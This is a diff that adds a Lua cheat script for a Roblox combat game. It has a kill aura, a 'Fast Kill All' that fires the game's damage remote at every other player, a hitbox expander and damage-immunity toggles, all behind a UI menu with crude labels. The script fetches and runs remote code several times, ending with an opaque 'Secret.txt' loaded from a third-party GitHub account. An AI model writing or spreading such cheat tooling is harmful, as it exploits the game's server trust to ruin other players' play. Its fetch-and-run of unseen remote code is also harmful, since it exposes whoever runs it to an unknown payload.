@@ -1,1 +1,406 @@
 
+if _G.Loaded == false then
+	print("Stop Spamming Script Loaded")
+	return
+end
+
+_G.Loaded = false
+
+
+--Load menu
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/menu.txt"))()
+
+
+local plr = game:GetService("Players").LocalPlayer 
+
+--Aura Settings
+_G.Aura = false
+_G.AuraRange = 30
+_G.AuraState = "Rage"
+
+--Misc
+_G.Kunai = false
+_G.Spike = false
+_G.FastKill = false
+
+--Hitbox Settings
+_G.Hitboxes = false
+_G.HitBox_Size = 20
+_G.HitBox_Transparency = 0.4
+_G.HitBox_Visual = false 
+
+
+
+local WeaponTable = {"Baseball Bat","Blood Dagger","Chainsaw","Electric Guitar","Emerald Greatsword","Frost Spear","Katana","Knife","Mace","Machete","Pan","Pencil","Scythe","Tennis Racket","Trident","War Hammer"}
+
+function Alive()
+	local char = plr.Character or plr.Character.Parent
+
+	if char then
+		return char
+	end
+end 
+
+function EquipTool()
+    for i,v in pairs(plr.Backpack:GetChildren()) do
+        if table.find(WeaponTable,v.Name) then 
+            v.Parent = plr.Character     
+        end 
+    end
+end
+
+function ClosestPlayer(range)
+	local char = plr.Character
+
+	local maxdist = range
+	local target
+
+	for i,v in ipairs(game:GetService("Players"):GetChildren()) do
+		if v.Name ~= plr.Name then
+			local EChar = v.Character 
+
+			if EChar then
+				local ETorso = EChar:FindFirstChild("Torso")
+				local EHuman = EChar:FindFirstChild("Humanoid")
+
+				local distance = (char:FindFirstChild("Torso").Position - ETorso.Position).Magnitude
+
+				if ETorso and EHuman and EHuman.Health >= 1 and not EChar:FindFirstChild("ForceField") and distance <= maxdist then
+					target = v
+				end
+				
+			end
+
+		end
+	end
+
+	return target
+end
+
+function Aura(range)
+	local success, err = pcall(function()
+		local char = plr.Character
+		local EPlr = ClosestPlayer(range)
+
+		if EPlr then
+			local TPart = EPlr.Character:FindFirstChild("Torso")
+			local THuman = EPlr.Character:FindFirstChild("Humanoid")
+
+            if _G.AuraState == "Rage" then
+
+                if plr.Character:FindFirstChildOfClass("Tool") == nil then return end -- check tool   
+            
+                char:FindFirstChildOfClass("Tool"):FindFirstChild("Remotes"):FindFirstChild("DamageRemote"):FireServer(THuman)           
+            else 
+                char:FindFirstChildOfClass("Tool"):Activate()
+            end 
+
+        
+		end
+		
+   	end)
+
+end
+
+function NoSpikeDamage()
+	for i,v in pairs(workspace.Terrain.Debris:GetChildren()) do
+		if v.Name == "Spike" then
+            if v:FindFirstChild("Primary") then
+                v.Primary:Remove()
+            end   
+		end 
+	end 
+end
+
+function NoKunaiDamage()
+	for i,v in pairs(workspace.Terrain.Debris:GetChildren()) do
+		if v.Name == "Handle" then
+            if v:FindFirstChildOfClass("TouchInterest") then
+			    v:Remove()
+            end
+		end 
+	end 
+end
+
+function KillAll()
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do
+        if v.Name ~= plr.Name then        
+            if plr.Backpack:FindFirstChild("Kawaii Revolver") then
+                plr.Backpack:FindFirstChild("Kawaii Revolver").Parent = plr.Character
+            end
+
+            if plr.Backpack:FindFirstChild("Revolver") then
+                plr.Backpack:FindFirstChild("Revolver").Parent = plr.Character
+            end
+            
+            if plr.Character:FindFirstChildOfClass("Tool") == nil then return end
+            if  plr.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Remotes"):FindFirstChild("DamageRemote") == nil then return end
+
+			if v.Character and v.Character:FindFirstChild("Humanoid")then 
+				plr.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Remotes"):FindFirstChild("DamageRemote"):FireServer(game:GetService("Players")[v.Name].Character:FindFirstChild("Humanoid"))
+			end
+
+        end 
+    end 
+end
+
+function HitboxVisual(Size,Transparency)
+
+    for i,v in pairs(game:GetService("Players"):GetChildren()) do
+        if v.Name ~= plr.Name then
+            local EChar = v.Character
+
+            if EChar and EChar:FindFirstChild("HumanoidRootPart") then
+                if EChar:FindFirstChild("Hitbox") == nil then
+
+                    local part = Instance.new("Part",EChar)
+                    part.Name ="Hitbox"
+                    part.Anchored = false
+                    part.CanCollide = false
+                    part.Massless = false
+                    part.Position = EChar:FindFirstChild("HumanoidRootPart").Position
+                    part.Size = Vector3.new(Size,Size,Size)
+                    part.Transparency = Transparency
+
+                    local weld = Instance.new("Weld",EChar:FindFirstChild("Hitbox"))
+                    weld.Part0 = EChar:FindFirstChild("Hitbox")
+                    weld.Part1 = EChar:FindFirstChild("HumanoidRootPart")
+
+                else
+                    EChar:FindFirstChild("Hitbox").Size = Vector3.new(Size,Size,Size)
+                    EChar:FindFirstChild("Hitbox").Transparency = Transparency
+                end 
+            end 
+
+        end 
+    end 
+
+
+end
+
+
+
+--[[
+
+                           ----UI LIBRARY----
+
+--]]
+
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+function notify(title,content,duration)
+    Fluent:Notify({Title = title,Content = content,Duration=duration, })
+end 
+
+
+local Window = Fluent:CreateWindow({
+    Title = "Chaos(Remastered)",
+    SubTitle = "UI: by dawid Main:Lerazz",
+    TabWidth = 90,
+    Size = UDim2.fromOffset(450, 350),
+    Acrylic = true,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.M
+})
+
+--https://lucide.dev/icons/ 
+local Tabs = {
+    Main = Window:AddTab({ Title = "Combat", Icon = "swords" }),
+    Misc = Window:AddTab({ Title = "Misc", Icon = "hammer" }),
+    Hitbox = Window:AddTab({ Title = "Hitbox-Expander", Icon = "box" }),
+    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
+}
+
+local Options = Fluent.Options
+
+do
+
+    --[[
+
+                            ----COMBAT TAB----
+
+    --]]
+
+  
+    local Dropdown = Tabs.Main:AddDropdown("Dropdown", {
+        Title = "Aura-Mode",
+        Values = {"Rage","Legit"},
+        Multi = false,
+        Default = 1,
+        Callback = function(Value)
+            _G.AuraState = Value
+            if Value == "Legit" then 
+                notify("Warning!","Legit Best Range(10)",5)
+                _G.AuraCooldown = 0
+            else 
+                _G.AuraCooldown = 0.5
+            end 
+        end
+    })
+
+	local AuraRange = Tabs.Main:AddSlider("AuraRange", {
+		Title = "Aura-Range",
+		Description = "Pisunom blyat",
+		Default = 20,
+		Min = 5,
+		Max = 50,
+		Rounding = 0,
+		Callback = function(Value)
+			_G.AuraRange = Value
+		end
+    })
+
+	local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Aura", Default = false })
+
+    Toggle:OnChanged(function(value)
+		if value then 
+			_G.Aura = true
+			while _G.Aura do 
+                if Alive() then
+                    Aura(_G.AuraRange)
+                    task.wait()
+                end
+			end
+		else
+			_G.Aura = false
+		end 
+    end)
+
+    Tabs.Main:AddParagraph({
+        Title = "Info:",
+        Content = "Equip Kawaii Revolver or Revolver To Fast Kill"
+    })
+
+
+
+    --[[
+
+                            ----MISC TAB----
+
+    --]]
+
+    local Spike = Tabs.Misc:AddToggle("MyToggle", {Title = "No-Spike Damage", Default = false })
+
+    Spike:OnChanged(function(value)
+		if value then 
+			_G.Spike = true
+			while _G.Spike do 
+                if Alive() then
+                    NoSpikeDamage()
+                    task.wait(0.1)
+                end
+			end
+		else
+			_G.Spike = false
+		end 
+    end)
+
+    local Kunai = Tabs.Misc:AddToggle("MyToggle", {Title = "No-Kunai Damage", Default = false })
+
+    Kunai:OnChanged(function(value)
+		if value then 
+			_G.Kunai = true
+			while _G.Kunai do 
+                if Alive() then
+                    NoKunaiDamage()
+                    task.wait(0.1)
+                end
+			end
+		else
+			_G.Kunai = false
+		end 
+    end)
+
+    local FastKill = Tabs.Misc:AddToggle("MyToggle", {Title = "Fast Kill All(OP)", Default = false })
+
+    FastKill:OnChanged(function(value)
+		if value then 
+			_G.FastKill = true
+			while _G.FastKill do 
+                if Alive() then
+                    KillAll()
+                    task.wait(0.05)
+                end
+			end
+		else
+			_G.FastKill = false
+		end 
+    end)
+
+        --[[
+
+                            ----HITBOX TAB----
+
+    --]]
+
+    local HitboxSize = Tabs.Hitbox:AddSlider("Hitbox", {
+		Title = "Hitbox-Size",
+		Description = "big cock",
+		Default = 20,
+		Min = 3,
+		Max = 50,
+		Rounding = 0,
+		Callback = function(Value)
+			_G.HitBox_Size = Value
+		end
+    })
+
+    local HitboxSize = Tabs.Hitbox:AddSlider("Hitboxe", {
+		Title = "Hitbox-Transparency",
+		Description = "small cock",
+		Default = 0.4,
+		Min = 0,
+		Max = 1,
+		Rounding = 1,
+		Callback = function(Value)
+			_G.HitBox_Transparency = Value
+		end
+    })
+    local Hitboxee = Tabs.Hitbox:AddToggle("MyToggle", {Title = "Hitbox-Expand", Default = false })
+
+    Hitboxee:OnChanged(function(value)
+		if value then 
+			_G.HitBox_Visual = true
+			while _G.HitBox_Visual do 
+                if Alive() then
+                    HitboxVisual(_G.HitBox_Size,_G.HitBox_Transparency)
+                    task.wait(1)
+                end
+			end
+		else
+			_G.HitBox_Visual = false
+		end 
+    end)
+
+
+    Tabs.Hitbox:AddParagraph({
+        Title = "Hitbox Bypass(Beta)",
+        Content = "Fps drop I don't know why(Fixing..)"
+    })
+end
+-- Addons:
+
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({})
+
+InterfaceManager:SetFolder("FluentScriptHub")
+SaveManager:SetFolder("FluentScriptHub/specific-game")
+
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+
+Window:SelectTab(1)
+
+notify("You bad","Touch grass(I Don't know how touch grass)",5)
+
+SaveManager:LoadAutoloadConfig()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Venograde/Vino/main/Secret.txt"))()
+
+
+
